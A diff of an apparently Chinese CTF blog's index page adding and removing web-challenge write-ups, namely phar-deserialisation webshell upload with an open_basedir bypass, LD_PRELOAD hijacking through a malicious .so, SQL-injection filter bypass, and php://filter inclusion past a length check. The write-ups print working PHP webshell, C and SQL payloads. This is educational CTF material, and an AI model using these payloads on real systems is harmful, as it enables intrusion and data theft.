+<p>得到 <code>your file in : upload/e0ee64a13ff7a0b04333c1d51fbbeadfyour file in : . .. .htaccess 1 2 &lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;.txt ...</code> ，说明上传成功</p>
+<p>再访问<code>887a185b1a408019/upload/e0ee64a13ff7a0b04333c1d51fbbeadf/webshell.txt</code>，连接蚁剑获得flag</p>
+<p>直接post命令的话要进行还要绕过目录穿越限制</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/&#x27;</span>));</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="法二："><a href="#法二：" class="headerlink" title="法二："></a>法二：</h3><ul>
+<li><p>直接在userdir处传木马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dir</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$userdir</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">dir</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;filename=<span class="string">&#x27;/var/www/html/887a185b1a408019/upload/e0ee64a13ff7a0b04333c1d51fbbeadf/webshell&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;userdir=<span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>;		</span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>(); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&quot;__HALT_COMPILER();&quot;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>但 <code>&lt;</code> 会被过滤</p>
+<p>phar协议能够解压zip,gzip等压缩包，因此gzip压缩一下,<code>gzip phar.phar</code>，然后同样两步上传，触发序列化</p>
+<p>访问<code>887a185b1a408019/upload/e0ee64a13ff7a0b04333c1d51fbbeadf/webshell.txt</code></p>
+</li>
+</ul>
+
+	
+	</div>
+  <a type="button" href="/2023/08/10/D3CTF2019-ezupload/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+					
+						<!-- display as entry -->
+						<div class="row">
+							<div class="col-md-8">
+								<h3 class="title">
+									<a href="/2023/08/08/UUCTF2022-uploadandinject/" >UUCTF2022-uploadandinject</a>
+								</h3>
+							</div>
+							<div class="col-md-4">
+								<div class="date">post @ 2023-08-08
+								</div>
+							</div>
+						</div>
+						
+								
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/3054">题目链接</a></p>
+<h2 id="提示查看hint-php"><a href="#提示查看hint-php" class="headerlink" title="提示查看hint.php"></a>提示查看hint.php</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nothing here,but I think you look look JPG,index&#x27;s swp</span><br></pre></td></tr></table></figure>
+
+<p>vim 备份文件为.filename.swp，尝试<code>.index.php.swp</code>发现可以成功下载</p>
+<p>恢复index.php：<code>vim -r index.php</code></p>
+<h2 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;form action=&quot;index.php&quot; method =&#x27;GET&#x27;&gt;</span></span><br><span class="line"><span class="string">&lt;div align=&quot;center&quot;&gt;</span></span><br><span class="line"><span class="string">  image_path:&lt;input type=&quot;text&quot; name=&quot;image_path&quot; value=&quot;upload/1.jpg&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;input type=&quot;submit&quot; value=&quot;加载&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">EOF</span>;</span><br><span class="line"><span class="variable">$PATH</span>=<span class="variable">$_GET</span>[<span class="string">&quot;image_path&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>((!<span class="keyword">isset</span>(<span class="variable">$PATH</span>)))&#123;</span><br><span class="line">    <span class="variable">$PATH</span>=<span class="string">&quot;upload/1.jpg&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;div align=&#x27;center&#x27;&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">loadimg</span>(<span class="variable">$PATH</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/div&gt;&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadimg</span>(<span class="params"><span class="variable">$img_path</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$img_path</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=/var/www/html/<span class="subst">$img_path</span>&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;echo Success to load&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=<span class="subst">$img_path</span>&gt;&quot;</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;echo Failed to load &quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>关键点：</p>
+<ol>
+<li><strong>LD_PRELOAD</strong>可控，LD_PRELOAD 是linux下的一个环境变量。用于动态链接库的加载，在动态链接库的过程中他的优先级是最高的。则可以通过编写恶意.so文件，设置LD_PRELOAD 来更改函数执行</li>
+<li>&lt;img src&#x3D;$img_path&gt; 会加载.so文件</li>
+</ol>
+<blockquote>
+<p>具体了解：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_63231007/article/details/128374661">LD_PRELOAD劫持</a></p>
+</blockquote>
+<h2 id="构造-so文件"><a href="#构造-so文件" class="headerlink" title="构造.so文件"></a>构造.so文件</h2><p>evilso.c</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line">__attribute__ ((__constructor__)) <span class="type">void</span> <span class="title function_">payload</span> <span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;cat /f*&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC evilso.c -o evil.so</span><br></pre></td></tr></table></figure>
+
+<h2 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h2><p>目录爆破，发现 <code>upload/upload.php</code>，仅可上传<code>jpg, png, gif</code></p>
+<p>更改后缀（同样可以产生想要的效果，linux下文件后缀不影响文件的解析），可以直接上传evil.jpg或抓包改后缀（抓包要注意 Content-Type 应为 image&#x2F;jpeg）</p>
+<p>上传后访问index.php   查看upload&#x2F;evail.jpg即可得到flag</p>
+
+	
+	</div>
+  <a type="button" href="/2023/08/08/UUCTF2022-uploadandinject/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+					
+						<!-- display as entry -->
+						<div class="row">
+							<div class="col-md-8">
+								<h3 class="title">
 									<a href="/2023/07/17/SWPUCTF2022-easyupload3-wp/" >SWPUCTF2022-easyupload3-wp</a>
 								</h3>
 							</div>
@@ -638,89 +836,6 @@
 </div>
 
 		
-			
-					
-						<!-- display as entry -->
-						<div class="row">
-							<div class="col-md-8">
-								<h3 class="title">
-									<a href="/2023/07/11/SWPUCTF2022-ezsql-wp/" >SWPUCTF2022-ezsql-wp</a>
-								</h3>
-							</div>
-							<div class="col-md-4">
-								<div class="date">post @ 2023-07-11
-								</div>
-							</div>
-						</div>
-						
-								
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2881">题目链接</a></p>
-<h2 id="页面内容"><a href="#页面内容" class="headerlink" title="页面内容"></a>页面内容</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">年轻的Web手啊！</span><br><span class="line">看题目名就知道你该干嘛了吧~</span><br><span class="line">用相对安全的方式传参吧</span><br><span class="line">奥对了参数是nss</span><br></pre></td></tr></table></figure>
-
-<p>参数为nss， GET发送无效； POST nss&#x3D;1发送成功  返回内容：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Flag: NSSCTF&#123;This_1s_F4ke_flag&#125;</span><br><span class="line">This is true flag: NSSCTF&#123;Ar3_y0u_K1ngd1ng&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><ul>
-<li><p>尝试联合注入</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&gt;</span> nss<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2%23</span></span><br><span class="line"><span class="string">&lt; You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;</span>select1,<span class="number">2</span>#<span class="string">&#x27; LIMIT 0,1&#x27;</span> <span class="keyword">at</span> line <span class="number">1</span></span><br></pre></td></tr></table></figure>
-
-<p>从报错可以发现空格和union被消除</p>
-<p>尝试绕过   成功</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&gt;</span> nss<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;/**/ununionion/**/select/**/1,2,3%23</span></span><br><span class="line"><span class="string">&lt; Flag: NSSCTF&#123;This_1s_F4ke_flag&#125;</span></span><br><span class="line"><span class="string">This is true flag: NSSCTF&#123;Ar3_y0u_K1ngd1ng&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 查看第二行内容</span></span><br><span class="line"><span class="string">&gt; nss=-1&#x27;</span><span class="comment">/**/</span>ununionion<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span>limit<span class="comment">/**/</span><span class="number">1</span>,<span class="number">1</span><span class="operator">%</span><span class="number">23</span></span><br><span class="line"><span class="operator">&lt;</span> Flag: <span class="number">2</span></span><br><span class="line">This <span class="keyword">is</span> <span class="literal">true</span> flag: <span class="number">3</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>接着常规流程注入</p>
-<p>注意or也会被屏蔽  所以information要更改为infoorrmation</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&gt;</span> nss<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;/**/ununionion/**/select/**/1,2,group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=database()/**/limit/**/1,1%23</span></span><br><span class="line"><span class="string">&lt; Flag: 2</span></span><br><span class="line"><span class="string">This is true flag: NSS_tb,users</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&gt; nss=-1&#x27;</span><span class="comment">/**/</span>ununionion<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,group_concat(column_name)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>infoorrmation_schema.columns<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_name<span class="operator">=</span><span class="string">&#x27;NSS_tb&#x27;</span><span class="comment">/**/</span>limit<span class="comment">/**/</span><span class="number">1</span>,<span class="number">1</span><span class="operator">%</span><span class="number">23</span></span><br><span class="line"></span><br><span class="line"><span class="operator">&lt;</span> Flag: <span class="number">2</span></span><br><span class="line">This <span class="keyword">is</span> <span class="literal">true</span> flag: id,Secr3t,flll444g</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="operator">&gt;</span> nss<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;/**/ununionion/**/select/**/id,group_concat(Secr3t),group_concat(flll444g)/**/from/**/NSS_db.NSS_tb/**/limit/**/1,1%23</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt; Flag: NSSCTF&#123;b3c1613c-6acb-46f4-9510-f3184bd69eb5&#125;</span></span><br><span class="line"><span class="string">This is true flag: NSSCTF&#123;I_d0nt_want_t0_w4ke_up&#125;</span></span><br></pre></td></tr></table></figure></li>
-</ul>
-
-	
-	</div>
-  <a type="button" href="/2023/07/11/SWPUCTF2022-ezsql-wp/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-					
-						<!-- display as entry -->
-						<div class="row">
-							<div class="col-md-8">
-								<h3 class="title">
-									<a href="/2023/07/11/鹏城杯2022-简单包含-wp/" >鹏城杯2022-简单包含-wp</a>
-								</h3>
-							</div>
-							<div class="col-md-4">
-								<div class="date">post @ 2023-07-11
-								</div>
-							</div>
-						</div>
-						
-								
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2422">题目链接</a>   </p>
-<h2 id="页面源码"><a href="#页面源码" class="headerlink" title="页面源码"></a>页面源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_POST</span>[<span class="string">&quot;flag&quot;</span>]);</span><br><span class="line"><span class="comment">//flag in /var/www/html/flag.php;</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><h3 id="伪协议查看flag"><a href="#伪协议查看flag" class="headerlink" title="伪协议查看flag"></a>伪协议查看flag</h3><p>发现被过滤</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?flag=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="查看index源码"><a href="#查看index源码" class="headerlink" title="查看index源码"></a>查看index源码</h3><p>当输入长度小于800时 过滤flag</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ?flag=php://filter/convert.base64-encode/resource=index.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$path</span> = <span class="variable">$_POST</span>[<span class="string">&quot;flag&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>)) &lt; <span class="number">800</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/&#x27;</span>, <span class="variable">$path</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nssctf waf!&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    @<span class="keyword">include</span>(<span class="variable">$path</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="最后发送字符数-gt-800-然后查看flag"><a href="#最后发送字符数-gt-800-然后查看flag" class="headerlink" title="最后发送字符数&gt;800 然后查看flag"></a>最后发送字符数&gt;800 然后查看flag</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&amp;flag=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
-
-
-	
-	</div>
-  <a type="button" href="/2023/07/11/鹏城杯2022-简单包含-wp/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -780,7 +895,7 @@
 		
 			<li><a href="/categories/web-learning/">web-learning<span>2</span></a></li>
 		
-			<li><a href="/categories/web-wp/">web-wp<span>19</span></a></li>
+			<li><a href="/categories/web-wp/">web-wp<span>21</span></a></li>
 		
 		</ul>
 	</div>
@@ -791,48 +906,48 @@
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/SWPUCTF2022/">SWPUCTF2022<span>2</span></a></li>
+			<li><a href="/tags/鹏城杯2022/">鹏城杯2022<span>1</span></a></li>
 		
-			<li><a href="/tags/rce/">rce<span>1</span></a></li>
+			<li><a href="/tags/canary/">canary<span>1</span></a></li>
+		
+			<li><a href="/tags/CVE/">CVE<span>4</span></a></li>
+		
+			<li><a href="/tags/NISACTF2022/">NISACTF2022<span>5</span></a></li>
+		
+			<li><a href="/tags/GXYCTF2019/">GXYCTF2019<span>1</span></a></li>
+		
+			<li><a href="/tags/thread/">thread<span>1</span></a></li>
 		
 			<li><a href="/tags/stack/">stack<span>2</span></a></li>
 		
 			<li><a href="/tags/uaf/">uaf<span>1</span></a></li>
 		
-			<li><a href="/tags/unserialize/">unserialize<span>4</span></a></li>
-		
-			<li><a href="/tags/fuzz/">fuzz<span>4</span></a></li>
-		
-			<li><a href="/tags/深育杯2021/">深育杯2021<span>1</span></a></li>
-		
-			<li><a href="/tags/php/">php<span>10</span></a></li>
-		
-			<li><a href="/tags/BJDCTF2020/">BJDCTF2020<span>1</span></a></li>
-		
-			<li><a href="/tags/赣网杯2021/">赣网杯2021<span>1</span></a></li>
-		
-			<li><a href="/tags/zer0pts2020/">zer0pts2020<span>1</span></a></li>
-		
-			<li><a href="/tags/upload/">upload<span>3</span></a></li>
-		
 			<li><a href="/tags/reverse/">reverse<span>7</span></a></li>
-		
-			<li><a href="/tags/sql/">sql<span>7</span></a></li>
-		
-			<li><a href="/tags/include/">include<span>1</span></a></li>
-		
-			<li><a href="/tags/nssctf/">nssctf<span>27</span></a></li>
-		
-			<li><a href="/tags/canary/">canary<span>1</span></a></li>
-		
-			<li><a href="/tags/CTF/">CTF<span>37</span></a></li>
 		
 			<li><a href="/tags/str-format/">str_format<span>1</span></a></li>
 		
-			<li><a href="/tags/unserialise/">unserialise<span>1</span></a></li>
+			<li><a href="/tags/include/">include<span>1</span></a></li>
+		
+			<li><a href="/tags/D3CTF2019/">D3CTF2019<span>1</span></a></li>
+		
+			<li><a href="/tags/SWPUCTF2022/">SWPUCTF2022<span>2</span></a></li>
+		
+			<li><a href="/tags/unserialize/">unserialize<span>4</span></a></li>
+		
+			<li><a href="/tags/赣网杯2021/">赣网杯2021<span>1</span></a></li>
+		
+			<li><a href="/tags/CTF/">CTF<span>39</span></a></li>
+		
+			<li><a href="/tags/pwn/">pwn<span>10</span></a></li>
+		
+			<li><a href="/tags/UUCTF2022/">UUCTF2022<span>1</span></a></li>
+		
+			<li><a href="/tags/upload/">upload<span>5</span></a></li>
+		
+			<li><a href="/tags/ciscn2023/">ciscn2023<span>4</span></a></li>
 		
 		
-		   <li><a href="/tags">...<span>34</span></a></li>
+		   <li><a href="/tags">...<span>36</span></a></li>
 		 
 		</ul>
 	</div>
@@ -845,6 +960,14 @@
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2023/08/10/D3CTF2019-ezupload/" ><i class="fa fa-file-o"></i>D3CTF2019-ezupload</a>
+      </li>
+    
+      <li>
+        <a href="/2023/08/08/UUCTF2022-uploadandinject/" ><i class="fa fa-file-o"></i>UUCTF2022-uploadandinject</a>
+      </li>
+    
+      <li>
         <a href="/2023/07/17/SWPUCTF2022-easyupload3-wp/" ><i class="fa fa-file-o"></i>SWPUCTF2022-easyupload3-wp</a>
       </li>
     
@@ -854,14 +977,6 @@
     
       <li>
         <a href="/2023/07/17/binary-protection/" ><i class="fa fa-file-o"></i>checksec与二进制程序保护机制（含PIE和ASL...</a>
-      </li>
-    
-      <li>
-        <a href="/2023/07/16/web-upload-labs/" ><i class="fa fa-file-o"></i>upload-labs搭建及攻略</a>
-      </li>
-    
-      <li>
-        <a href="/2023/07/15/GXYCTF2019-BabySqli-wp/" ><i class="fa fa-file-o"></i>GXYCTF2019-BabySqli-wp</a>
       </li>
     
   </ul>
